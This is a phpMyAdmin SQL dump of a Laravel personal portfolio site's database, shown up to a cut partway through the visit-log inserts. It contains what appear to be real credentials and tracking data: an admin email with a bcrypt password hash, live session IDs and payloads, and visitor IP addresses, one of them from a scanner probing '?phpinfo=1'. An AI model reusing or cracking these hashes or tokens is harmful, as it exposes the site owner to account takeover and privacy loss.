-- phpMyAdmin SQL Dump
-- version 5.2.1
-- https://www.phpmyadmin.net/
--
-- Host: localhost
-- Generation Time: Jul 16, 2025 at 04:47 AM
-- Server version: 10.11.13-MariaDB-ubu2204
-- PHP Version: 8.0.30

SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO";
START TRANSACTION;
SET time_zone = "+00:00";


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8mb4 */;

--
-- Database: `pete_db_peterus_id`
--

-- --------------------------------------------------------

--
-- Table structure for table `abouts`
--

CREATE TABLE `abouts` (
  `id` bigint(20) UNSIGNED NOT NULL,
  `headline` varchar(255) NOT NULL,
  `description` text NOT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;

--
-- Dumping data for table `abouts`
--

INSERT INTO `abouts` (`id`, `headline`, `description`, `created_at`, `updated_at`) VALUES
(1, 'Rangkuman', 'Lorem ipsum dolor sit amet', NULL, '2025-06-25 07:36:25');

-- --------------------------------------------------------

--
-- Table structure for table `cache`
--

CREATE TABLE `cache` (
  `key` varchar(255) NOT NULL,
  `value` mediumtext NOT NULL,
  `expiration` int(11) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;

-- --------------------------------------------------------

--
-- Table structure for table `cache_locks`
--

CREATE TABLE `cache_locks` (
  `key` varchar(255) NOT NULL,
  `owner` varchar(255) NOT NULL,
  `expiration` int(11) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;

-- --------------------------------------------------------

--
-- Table structure for table `contacts`
--

CREATE TABLE `contacts` (
  `id` bigint(20) UNSIGNED NOT NULL,
  `name` varchar(255) NOT NULL,
  `email` varchar(255) NOT NULL,
  `phone` varchar(255) DEFAULT NULL,
  `message` text NOT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;

--
-- Dumping data for table `contacts`
--

INSERT INTO `contacts` (`id`, `name`, `email`, `phone`, `message`, `created_at`, `updated_at`) VALUES
(4, 'Rahmat', 'rahmat@gmail.com', '08678435874', 'Lorem Ipsum dolor sit amet', '2025-06-25 07:06:09', '2025-06-25 07:06:09');

-- --------------------------------------------------------

--
-- Table structure for table `education`
--

CREATE TABLE `education` (
  `id` bigint(20) UNSIGNED NOT NULL,
  `start_year` year(4) NOT NULL,
  `end_year` year(4) NOT NULL,
  `institution` varchar(255) NOT NULL,
  `location` varchar(255) NOT NULL,
  `degree` varchar(255) NOT NULL,
  `field_of_study` varchar(255) NOT NULL,
  `description` text DEFAULT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;

-- --------------------------------------------------------

--
-- Table structure for table `experiences`
--

CREATE TABLE `experiences` (
  `id` bigint(20) UNSIGNED NOT NULL,
  `start_year` year(4) NOT NULL,
  `end_year` year(4) DEFAULT NULL,
  `is_present` tinyint(1) NOT NULL DEFAULT 0,
  `position` varchar(255) NOT NULL,
  `company` varchar(255) NOT NULL,
  `location` varchar(255) NOT NULL,
  `description` text DEFAULT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;

-- --------------------------------------------------------

--
-- Table structure for table `failed_jobs`
--

CREATE TABLE `failed_jobs` (
  `id` bigint(20) UNSIGNED NOT NULL,
  `uuid` varchar(255) NOT NULL,
  `connection` text NOT NULL,
  `queue` text NOT NULL,
  `payload` longtext NOT NULL,
  `exception` longtext NOT NULL,
  `failed_at` timestamp NOT NULL DEFAULT current_timestamp()
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;

-- --------------------------------------------------------

--
-- Table structure for table `jobs`
--

CREATE TABLE `jobs` (
  `id` bigint(20) UNSIGNED NOT NULL,
  `queue` varchar(255) NOT NULL,
  `payload` longtext NOT NULL,
  `attempts` tinyint(3) UNSIGNED NOT NULL,
  `reserved_at` int(10) UNSIGNED DEFAULT NULL,
  `available_at` int(10) UNSIGNED NOT NULL,
  `created_at` int(10) UNSIGNED NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;

-- --------------------------------------------------------

--
-- Table structure for table `job_batches`
--

CREATE TABLE `job_batches` (
  `id` varchar(255) NOT NULL,
  `name` varchar(255) NOT NULL,
  `total_jobs` int(11) NOT NULL,
  `pending_jobs` int(11) NOT NULL,
  `failed_jobs` int(11) NOT NULL,
  `failed_job_ids` longtext NOT NULL,
  `options` mediumtext DEFAULT NULL,
  `cancelled_at` int(11) DEFAULT NULL,
  `created_at` int(11) NOT NULL,
  `finished_at` int(11) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;

-- --------------------------------------------------------

--
-- Table structure for table `languages`
--

CREATE TABLE `languages` (
  `id` bigint(20) UNSIGNED NOT NULL,
  `name` varchar(255) NOT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;

-- --------------------------------------------------------

--
-- Table structure for table `migrations`
--

CREATE TABLE `migrations` (
  `id` int(10) UNSIGNED NOT NULL,
  `migration` varchar(255) NOT NULL,
  `batch` int(11) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;

--
-- Dumping data for table `migrations`
--

INSERT INTO `migrations` (`id`, `migration`, `batch`) VALUES
(1, '0001_01_01_000000_create_users_table', 1),
(2, '0001_01_01_000001_create_cache_table', 1),
(3, '0001_01_01_000002_create_jobs_table', 1),
(4, '2025_05_15_013124_create_projects_table', 2),
(5, '2025_05_15_013355_create_abouts_table', 2),
(6, '2025_05_15_013509_create_contacts_table', 2),
(7, '2025_05_15_013708_create_experiences_table', 2),
(8, '2025_05_15_013741_create_education_table', 2),
(9, '2025_05_15_013813_create_skills_table', 2),
(10, '2025_05_16_031348_create_languages_table', 3),
(11, '2025_05_16_033712_add_name_at_table_languages', 4),
(12, '2025_05_16_035141_create_visits_table', 5);

-- --------------------------------------------------------

--
-- Table structure for table `password_reset_tokens`
--

CREATE TABLE `password_reset_tokens` (
  `email` varchar(255) NOT NULL,
  `token` varchar(255) NOT NULL,
  `created_at` timestamp NULL DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;

-- --------------------------------------------------------

--
-- Table structure for table `projects`
--

CREATE TABLE `projects` (
  `id` bigint(20) UNSIGNED NOT NULL,
  `name` varchar(255) NOT NULL,
  `description` text NOT NULL,
  `image` varchar(255) NOT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;

-- --------------------------------------------------------

--
-- Table structure for table `sessions`
--

CREATE TABLE `sessions` (
  `id` varchar(255) NOT NULL,
  `user_id` bigint(20) UNSIGNED DEFAULT NULL,
  `ip_address` varchar(45) DEFAULT NULL,
  `user_agent` text DEFAULT NULL,
  `payload` longtext NOT NULL,
  `last_activity` int(11) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;

--
-- Dumping data for table `sessions`
--

INSERT INTO `sessions` (`id`, `user_id`, `ip_address`, `user_agent`, `payload`, `last_activity`) VALUES
('0yqSlnkpvZzjzvvax3nNlzolp4hY7nLF2kewLLX7', NULL, '144.217.135.237', 'Mozilla/5.0 (compatible; Dataprovider.com)', 'YTozOntzOjY6Il90b2tlbiI7czo0MDoiWE5hOWVXMTVGa0pMa2hQZ3dZM2ZqUk42MkpTMWRQczFTZThzR3VKdSI7czo5OiJfcHJldmlvdXMiO2E6MTp7czozOiJ1cmwiO3M6MjI6Imh0dHBzOi8vd3d3LnBldGVydXMuaWQiO31zOjY6Il9mbGFzaCI7YToyOntzOjM6Im9sZCI7YTowOnt9czozOiJuZXciO2E6MDp7fX19', 1752594205),
('2y9jpHfGeSo4nAsW9w5VmubVWQVT3x6gwR5BCBVp', 1, '114.79.0.53', 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Mobile Safari/537.36', 'YTo0OntzOjY6Il90b2tlbiI7czo0MDoiNlJNT2VhdmhuNjB6aEdzQ1BybXFQazJvaW95VjJPenFTMEVFaUk0eSI7czo5OiJfcHJldmlvdXMiO2E6MTp7czozOiJ1cmwiO3M6MzQ6Imh0dHBzOi8vcGV0ZXJ1cy5pZC9hZG1pbi9kYXNoYm9hcmQiO31zOjY6Il9mbGFzaCI7YToyOntzOjM6Im9sZCI7YTowOnt9czozOiJuZXciO2E6MDp7fX1zOjUwOiJsb2dpbl93ZWJfNTliYTM2YWRkYzJiMmY5NDAxNTgwZjAxNGM3ZjU4ZWE0ZTMwOTg5ZCI7aToxO30=', 1752592990),
('6VaTvPej97jr6607CzLYTAyKffz5MWVK3Qfsxz69', NULL, '149.56.160.226', 'Mozilla/5.0 (compatible; Dataprovider.com)', 'YTozOntzOjY6Il90b2tlbiI7czo0MDoiRVFLUkltZk8yaG9TQ0FxelllN05tS0tJaWJlamRzUXB6TktsajROcCI7czo5OiJfcHJldmlvdXMiO2E6MTp7czozOiJ1cmwiO3M6MjI6Imh0dHBzOi8vd3d3LnBldGVydXMuaWQiO31zOjY6Il9mbGFzaCI7YToyOntzOjM6Im9sZCI7YTowOnt9czozOiJuZXciO2E6MDp7fX19', 1752594232),
('aFCoinRwBJWlRpzDijZhau1t7BVhl39pMfTKHUkF', NULL, '93.158.91.24', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36', 'YTozOntzOjY6Il90b2tlbiI7czo0MDoieHRlVzFCcVZXSHpFZkNFb1pwU3RaSlU0Wk9TMlNIb3ZoUm1KVlBMWSI7czo5OiJfcHJldmlvdXMiO2E6MTp7czozOiJ1cmwiO3M6MTg6Imh0dHBzOi8vcGV0ZXJ1cy5pZCI7fXM6NjoiX2ZsYXNoIjthOjI6e3M6Mzoib2xkIjthOjA6e31zOjM6Im5ldyI7YTowOnt9fX0=', 1752623177),
('atliRsfKYXZnesAgusPHLyjZhxuCIi1gefqpm357', NULL, '139.162.3.141', 'Mozilla/5.0 (Linux; Android 8; SM-G357FZ; Build/OPD2.190201.129) AppleWebKit/537.36 (KHTML', 'YTozOntzOjY6Il90b2tlbiI7czo0MDoiV2YxZnVYVDhoMkdDTGtjMkJ5Q1pmRk1yRzZjQ09hRXVpNmxGQnVoQSI7czo5OiJfcHJldmlvdXMiO2E6MTp7czozOiJ1cmwiO3M6MTg6Imh0dHBzOi8vcGV0ZXJ1cy5pZCI7fXM6NjoiX2ZsYXNoIjthOjI6e3M6Mzoib2xkIjthOjA6e31zOjM6Im5ldyI7YTowOnt9fX0=', 1752581619),
('DkPb48UUH0C5sttoDznqgbhs2McgxcjaMYVcppYc', 1, '114.79.5.141', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36 Edg/138.0.0.0', 'YTo0OntzOjY6Il90b2tlbiI7czo0MDoiZmlPdEY3V0N0ODR2M0hwVnpUMjJZOVJESVEwTlgxamhuV3lpVVlCViI7czo5OiJfcHJldmlvdXMiO2E6MTp7czozOiJ1cmwiO3M6MTg6Imh0dHBzOi8vcGV0ZXJ1cy5pZCI7fXM6NjoiX2ZsYXNoIjthOjI6e3M6Mzoib2xkIjthOjA6e31zOjM6Im5ldyI7YTowOnt9fXM6NTA6ImxvZ2luX3dlYl81OWJhMzZhZGRjMmIyZjk0MDE1ODBmMDE0YzdmNThlYTRlMzA5ODlkIjtpOjE7fQ==', 1752591855),
('EbEok31NBqyML7P2COXvWkMsZtMhkjEBqaoNeRkh', NULL, '202.133.2.42', 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Mobile Safari/537.36', 'YTozOntzOjY6Il90b2tlbiI7czo0MDoibE5yUUpBY1BGRk1WQ29OZnV1TElFT0F1d29tRTJndEFvSFYwMnVKNyI7czo5OiJfcHJldmlvdXMiO2E6MTp7czozOiJ1cmwiO3M6MTg6Imh0dHBzOi8vcGV0ZXJ1cy5pZCI7fXM6NjoiX2ZsYXNoIjthOjI6e3M6Mzoib2xkIjthOjA6e31zOjM6Im5ldyI7YTowOnt9fX0=', 1752568655),
('IqHKpSwQ0kiTU97dx6amfJWFVTasxKkWQ3bs9X0y', NULL, '36.89.117.227', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36 Edg/138.0.0.0', 'YTozOntzOjY6Il90b2tlbiI7czo0MDoickFUSUh3ZHJFTmJVdGticmxOcUVUOUpuaUJGTzRFTERSWEZ6VVFnWSI7czo5OiJfcHJldmlvdXMiO2E6MTp7czozOiJ1cmwiO3M6MTg6Imh0dHBzOi8vcGV0ZXJ1cy5pZCI7fXM6NjoiX2ZsYXNoIjthOjI6e3M6Mzoib2xkIjthOjA6e31zOjM6Im5ldyI7YTowOnt9fX0=', 1752571929),
('jLZfYDUyNdPH3BvPX2SiyKHeLDUiYH7BzYv7QFMm', NULL, '36.89.117.227', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36', 'YTozOntzOjY6Il90b2tlbiI7czo0MDoiVGYyVWI2TkZOcGE1UmNId2d0RHJ4b2l4b0FPdFo3ekhJQ2xBak5OYSI7czo5OiJfcHJldmlvdXMiO2E6MTp7czozOiJ1cmwiO3M6MTg6Imh0dHBzOi8vcGV0ZXJ1cy5pZCI7fXM6NjoiX2ZsYXNoIjthOjI6e3M6Mzoib2xkIjthOjA6e31zOjM6Im5ldyI7YTowOnt9fX0=', 1752638492),
('mLOErM65ITEz3nAPkFsQFsEMpmBYKo4GxGQRZlN5', NULL, '40.77.167.53', 'Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/116.0.1938.76 Safari/537.36', 'YTozOntzOjY6Il90b2tlbiI7czo0MDoiemIwR3hMU1BCd3lsUUR1bzdvaDFNaDVkRzBDYkJta1BXSDYzeEJJNCI7czo5OiJfcHJldmlvdXMiO2E6MTp7czozOiJ1cmwiO3M6MjY6Imh0dHBzOi8vcGV0ZXJ1cy5pZC9jb250YWN0Ijt9czo2OiJfZmxhc2giO2E6Mjp7czozOiJvbGQiO2E6MDp7fXM6MzoibmV3IjthOjA6e319fQ==', 1752595230),
('p7h4Nc4sPkxVuN0fQjVnvNLxYNvuZH5ZKoUHoIxj', NULL, '103.59.160.164', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0', 'YTozOntzOjY6Il90b2tlbiI7czo0MDoiRE5aU0RmOERwdFZSRm5Gb0tRT0NrNzZuY0NXc1ltT2owcnpvNHY3aiI7czo5OiJfcHJldmlvdXMiO2E6MTp7czozOiJ1cmwiO3M6MTg6Imh0dHBzOi8vcGV0ZXJ1cy5pZCI7fXM6NjoiX2ZsYXNoIjthOjI6e3M6Mzoib2xkIjthOjA6e31zOjM6Im5ldyI7YTowOnt9fX0=', 1752591620),
('Pl8VKJH9F4OD0oP0RBwNt3AgQ1b128Z3NSM0inmv', NULL, '185.177.72.37', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36', 'YTozOntzOjY6Il90b2tlbiI7czo0MDoiNU5kTmhUUGJwSFNKcEJQSXY0a21ldFNZVW02ZDdPVnAzNlJvRXFPRyI7czo5OiJfcHJldmlvdXMiO2E6MTp7czozOiJ1cmwiO3M6MTg6Imh0dHBzOi8vcGV0ZXJ1cy5pZCI7fXM6NjoiX2ZsYXNoIjthOjI6e3M6Mzoib2xkIjthOjA6e31zOjM6Im5ldyI7YTowOnt9fX0=', 1752587691),
('rHLb7juJBxOfbm21RRuydGH4eaPWr1oQ1eLgrURP', 1, '36.89.117.227', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36', 'YTo0OntzOjY6Il90b2tlbiI7czo0MDoiZFlqOWk5VG8yaTNLeWloV2NXb1V3dVBSQ3g5WEk0ODNudFZKWHp2UyI7czo5OiJfcHJldmlvdXMiO2E6MTp7czozOiJ1cmwiO3M6MTg6Imh0dHBzOi8vcGV0ZXJ1cy5pZCI7fXM6NjoiX2ZsYXNoIjthOjI6e3M6Mzoib2xkIjthOjA6e31zOjM6Im5ldyI7YTowOnt9fXM6NTA6ImxvZ2luX3dlYl81OWJhMzZhZGRjMmIyZjk0MDE1ODBmMDE0YzdmNThlYTRlMzA5ODlkIjtpOjE7fQ==', 1752574260),
('rnOH2aDQuwxJqdoJ5Lqe4LlksF27uhhuBDcVGQnM', NULL, '139.162.3.141', '', 'YTozOntzOjY6Il90b2tlbiI7czo0MDoiRWpPRUxjcmtPamZwTUhtUkU0MUxWS1NEWXphSXFJekFrOFFvTjg5MyI7czo5OiJfcHJldmlvdXMiO2E6MTp7czozOiJ1cmwiO3M6MTg6Imh0dHBzOi8vcGV0ZXJ1cy5pZCI7fXM6NjoiX2ZsYXNoIjthOjI6e3M6Mzoib2xkIjthOjA6e31zOjM6Im5ldyI7YTowOnt9fX0=', 1752581640),
('rTPKmPXtyxwArQyj6PC3n8BzAsXUQGdkbwxL1TFq', NULL, '147.185.132.189', 'Hello from Palo Alto Networks, find out more about our scans in https://docs-cortex.paloaltonetworks.com/r/1/Cortex-Xpanse/Scanning-activity', 'YTozOntzOjY6Il90b2tlbiI7czo0MDoiTG9tMFNmOTB2YlVPcEZZYklraGRybjBpV25rTGZPTWFIMnplYnBXbiI7czo5OiJfcHJldmlvdXMiO2E6MTp7czozOiJ1cmwiO3M6MjI6Imh0dHBzOi8vd3d3LnBldGVydXMuaWQiO31zOjY6Il9mbGFzaCI7YToyOntzOjM6Im9sZCI7YTowOnt9czozOiJuZXciO2E6MDp7fX19', 1752574812),
('T8agXDVgf899n4jZibMfU1Xh1eXjdWw4N6Nh0g2v', NULL, '194.164.107.4', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36', 'YTozOntzOjY6Il90b2tlbiI7czo0MDoiblVpUWYxYTFLSHFLUnQ5a3h3ckdaa2tFcGREUGVucTl0bjdEcTFHZCI7czo5OiJfcHJldmlvdXMiO2E6MTp7czozOiJ1cmwiO3M6MjI6Imh0dHBzOi8vd3d3LnBldGVydXMuaWQiO31zOjY6Il9mbGFzaCI7YToyOntzOjM6Im9sZCI7YTowOnt9czozOiJuZXciO2E6MDp7fX19', 1752575905),
('UWIdInIrdbzU8k8X8SVX0MtVpZuvcjfljsAxPX8r', 1, '36.89.117.227', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:140.0) Gecko/20100101 Firefox/140.0', 'YTo0OntzOjY6Il90b2tlbiI7czo0MDoiVlh0TUNyMDNZOHFweE1MQWdmaGFhMXByaWw4SHd5OE81MWVEZHJvdSI7czo5OiJfcHJldmlvdXMiO2E6MTp7czozOiJ1cmwiO3M6MzM6Imh0dHBzOi8vcGV0ZXJ1cy5pZC9hZG1pbi9wcm9qZWN0cyI7fXM6NjoiX2ZsYXNoIjthOjI6e3M6Mzoib2xkIjthOjA6e31zOjM6Im5ldyI7YTowOnt9fXM6NTA6ImxvZ2luX3dlYl81OWJhMzZhZGRjMmIyZjk0MDE1ODBmMDE0YzdmNThlYTRlMzA5ODlkIjtpOjE7fQ==', 1752567502),
('Uzi4O19FIyid0pYTLxIV3rKtJu8Br8QfjcBQ6pog', NULL, '36.89.117.227', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36 Edg/138.0.0.0', 'YTozOntzOjY6Il90b2tlbiI7czo0MDoiSU1VZk82OHZVTFBaaEVrNVdzeHR3OFlhTGF1NmJFZlRSNmc2REQ1ZCI7czo5OiJfcHJldmlvdXMiO2E6MTp7czozOiJ1cmwiO3M6MTg6Imh0dHBzOi8vcGV0ZXJ1cy5pZCI7fXM6NjoiX2ZsYXNoIjthOjI6e3M6Mzoib2xkIjthOjA6e31zOjM6Im5ldyI7YTowOnt9fX0=', 1752639449),
('weL15j9zDkXOLMPvvaGDxbECmL357cmCoo563LAh', 1, '36.89.117.227', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:140.0) Gecko/20100101 Firefox/140.0', 'YTo0OntzOjY6Il90b2tlbiI7czo0MDoibFRLZnpLcUFtblY2NVhpR2MwbU5Zekhmb0dWVDVlZ1VER0RZU2NpMiI7czo5OiJfcHJldmlvdXMiO2E6MTp7czozOiJ1cmwiO3M6MzY6Imh0dHBzOi8vcGV0ZXJ1cy5pZC9hZG1pbi91cmxzL2NyZWF0ZSI7fXM6NjoiX2ZsYXNoIjthOjI6e3M6Mzoib2xkIjthOjA6e31zOjM6Im5ldyI7YTowOnt9fXM6NTA6ImxvZ2luX3dlYl81OWJhMzZhZGRjMmIyZjk0MDE1ODBmMDE0YzdmNThlYTRlMzA5ODlkIjtpOjE7fQ==', 1752640996);

-- --------------------------------------------------------

--
-- Table structure for table `skills`
--

CREATE TABLE `skills` (
  `id` bigint(20) UNSIGNED NOT NULL,
  `name` varchar(255) NOT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;

-- --------------------------------------------------------

--
-- Table structure for table `urls`
--

CREATE TABLE `urls` (
  `id` bigint(20) UNSIGNED NOT NULL,
  `group` varchar(255) NOT NULL,
  `name` varchar(255) NOT NULL,
  `url` varchar(255) NOT NULL,
  `description` text DEFAULT NULL,
  `status` enum('active','inactive') NOT NULL DEFAULT 'active',
  `last_use` timestamp NULL DEFAULT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;

-- --------------------------------------------------------

--
-- Table structure for table `users`
--

CREATE TABLE `users` (
  `id` bigint(20) UNSIGNED NOT NULL,
  `name` varchar(255) NOT NULL,
  `email` varchar(255) NOT NULL,
  `email_verified_at` timestamp NULL DEFAULT NULL,
  `password` varchar(255) NOT NULL,
  `remember_token` varchar(100) DEFAULT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;

--
-- Dumping data for table `users`
--

INSERT INTO `users` (`id`, `name`, `email`, `email_verified_at`, `password`, `remember_token`, `created_at`, `updated_at`) VALUES
(1, 'Peterus', 'mail@peterus.id', NULL, '$2y$12$X4ijup0v75eK1UAPYF9I6O.DLO6HhEvx3IRDiuz5MEQ6TBOyCJvWK', NULL, '2025-05-15 03:46:59', '2025-05-15 03:46:59');

-- --------------------------------------------------------

--
-- Table structure for table `visits`
--

CREATE TABLE `visits` (
  `id` bigint(20) UNSIGNED NOT NULL,
  `ip_address` varchar(45) NOT NULL,
  `user_agent` varchar(255) DEFAULT NULL,
  `url` varchar(255) NOT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;

--
-- Dumping data for table `visits`
--

INSERT INTO `visits` (`id`, `ip_address`, `user_agent`, `url`, `created_at`, `updated_at`) VALUES
(8, '127.0.0.1', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:138.0) Gecko/20100101 Firefox/138.0', '', '2025-05-16 07:45:46', '2025-05-16 07:45:46'),
(9, '36.89.117.227', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36', 'https://peterus.id', '2025-06-25 06:10:54', '2025-06-25 06:10:54'),
(10, '36.89.117.227', 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36', 'https://peterus.id', '2025-06-25 06:29:08', '2025-06-25 06:29:08'),
(11, '114.10.28.148', 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36', 'https://peterus.id', '2025-06-25 07:06:33', '2025-06-25 07:06:33'),
(12, '114.10.28.148', 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36', 'https://peterus.id', '2025-06-25 07:06:56', '2025-06-25 07:06:56'),
(13, '36.89.117.227', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36 Edg/137.0.0.0', 'https://peterus.id', '2025-06-25 07:17:46', '2025-06-25 07:17:46'),
(14, '36.89.117.227', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36 Edg/137.0.0.0', 'https://peterus.id', '2025-06-25 07:37:18', '2025-06-25 07:37:18'),
(15, '202.133.2.42', 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36', 'https://peterus.id', '2025-06-25 08:28:37', '2025-06-25 08:28:37'),
(16, '202.133.2.42', 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36', 'https://peterus.id', '2025-06-25 08:29:02', '2025-06-25 08:29:02'),
(17, '36.89.117.227', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36', 'https://peterus.id', '2025-06-25 09:16:45', '2025-06-25 09:16:45'),
(18, '139.162.3.144', 'Mozilla/5.0 (Linux; Android 12; SM-G781V; Build/SQ3A.200703.248) AppleWebKit/537.36 (KHTML', 'https://peterus.id', '2025-06-25 23:59:24', '2025-06-25 23:59:24'),
(19, '139.162.3.144', NULL, 'https://peterus.id', '2025-06-25 23:59:44', '2025-06-25 23:59:44'),
(20, '194.233.72.214', 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36', 'https://www.peterus.id', '2025-06-26 00:25:45', '2025-06-26 00:25:45'),
(21, '194.233.72.214', 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36', 'https://peterus.id', '2025-06-26 00:26:26', '2025-06-26 00:26:26'),
(22, '194.233.72.214', 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36', 'https://peterus.id/?phpinfo=1', '2025-06-26 00:26:57', '2025-06-26 00:26:57'),
(23, '118.26.37.95', 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36', 'https://peterus.id', '2025-06-26 08:37:51', '2025-06-26 08:37:51'),
(24, '152.32.135.132', 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36', 'https://www.peterus.id', '2025-06-26 08:37:51', '2025-06-26 08:37:51'),
(25, '58.152.22.146', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36', 'https://peterus.id', '2025-06-26 09:01:41', '2025-06-26 09:01:41'),
(26, '58.152.22.146', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36', 'https://www.peterus.id', '2025-06-26 09:01:42', '2025-06-26 09:01:42'),
(27, '42.200.231.243', 'BaiduSpider', 'https://peterus.id', '2025-06-26 12:26:46', '2025-06-26 12:26:46'),
